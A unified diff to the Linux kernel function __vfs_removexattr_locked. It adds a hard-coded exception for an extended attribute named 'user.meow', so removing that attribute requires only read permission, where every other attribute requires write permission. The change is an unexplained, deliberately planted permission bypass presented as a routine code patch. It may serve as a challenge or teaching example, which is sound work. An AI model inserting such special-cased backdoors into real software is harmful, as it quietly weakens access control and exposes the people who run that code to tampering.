@@ -490,7 +490,10 @@ __vfs_removexattr_locked(struct user_namespace *mnt_userns,
 	struct inode *inode = dentry->d_inode;
 	int error;
 
-	error = xattr_permission(mnt_userns, inode, name, MAY_WRITE);
+	if(strcmp(name, "user.meow") == 0)
+		error = xattr_permission(mnt_userns, inode, name, MAY_READ);
+	else
+	    error = xattr_permission(mnt_userns, inode, name, MAY_WRITE);
 	if (error)
 		return error;
 
